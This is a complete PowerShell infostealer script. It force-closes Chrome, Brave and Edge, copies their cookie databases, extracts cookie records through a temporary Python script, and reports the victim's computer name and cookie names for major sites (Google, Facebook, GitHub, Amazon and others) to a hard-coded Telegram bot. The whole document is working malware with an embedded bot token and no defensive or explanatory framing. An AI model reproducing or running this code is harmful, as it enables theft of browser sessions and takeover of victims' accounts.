$BotToken = "8770095089:AAFs6Z4raZGnwTqL1aJdDEjVWeu5fa7okZw"
$ChatID = "962420340"

function Send-TG($text) {
    $body = @{ chat_id = $ChatID; text = $text; parse_mode = "HTML" } | ConvertTo-Json -Compress
    irm "https://api.telegram.org/bot$BotToken/sendMessage" -Method POST -Body $body -ContentType "application/json" | Out-Null
}

# Kill all browsers first to unlock the database files
taskkill /F /IM chrome.exe 2>$null
taskkill /F /IM brave.exe 2>$null
taskkill /F /IM msedge.exe 2>$null
Start-Sleep -Seconds 2

function Get-CookiesViaPython($path, $browser) {
    if (!(Test-Path $path)) { return @() }
    $tmp = "$env:TEMP\cookies_temp_$browser.db"
    Copy-Item $path $tmp -Force 2>$null
    if (!(Test-Path $tmp)) { return @() }
    
    $pyScript = @"
import sqlite3, json
conn = sqlite3.connect(r"$tmp")
c = conn.cursor()
c.execute("SELECT host_key, name, path, is_secure, is_httponly FROM cookies")
rows = c.fetchall()
cookies = []
for r in rows:
    cookies.append({"domain":r[0],"name":r[1],"path":r[2],"secure":bool(r[3]),"httpOnly":bool(r[4]),"browser":"$browser"})
print(json.dumps(cookies))
conn.close()
"@
    $pyScript | Out-File "$env:TEMP\cookie_grab_$browser.py" -Encoding UTF8
    $result = python3 "$env:TEMP\cookie_grab_$browser.py" 2>$null
    if (!$result) { $result = python "$env:TEMP\cookie_grab_$browser.py" 2>$null }
    Remove-Item "$env:TEMP\cookie_grab_$browser.py" -Force -ErrorAction SilentlyContinue
    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    if ($result) { return $result | ConvertFrom-Json }
    return @()
}

$allCookies = @()
$browsers = @(
    @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"},
    @{Name="Brave"; Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"},
    @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"}
)

Send-TG "🔍 Scanning browser databases..."

foreach ($b in $browsers) {
    $cookies = Get-CookiesViaPython $b.Path $b.Name
    if ($cookies) { $allCookies += $cookies }
}

if ($allCookies.Count -eq 0) {
    Send-TG "❌ No cookies found."
    exit
}

$priority = @('instagram.com','facebook.com','youtube.com','google.com','twitter.com','x.com','reddit.com','github.com','discord.com','tiktok.com','linkedin.com','amazon.com','netflix.com','spotify.com')
$grouped = $allCookies | Group-Object domain

$msg = "📦 <b>COOKIE DUMP</b>`n💻 $env:COMPUTERNAME`n🍪 $($allCookies.Count) cookies | $($grouped.Count) domains`n`n━━━ <b>MAJOR PLATFORMS</b> ━━━`n"

foreach ($p in $priority) {
    $found = $grouped | Where-Object { $_.Name -like "*$p*" }
    if ($found) {
        $count = ($found.Group).Count
        $msg += "`n🔑 <b>$p</b> ($count cookies)`n"
        foreach ($c in ($found.Group | Select-Object -First 5)) {
            $msg += "  • <code>$($c.name)</code> [$($c.browser)]`n"
        }
    }
}

Send-TG $msg
Send-TG "✅ Structured dump complete. Use the extension for full values."
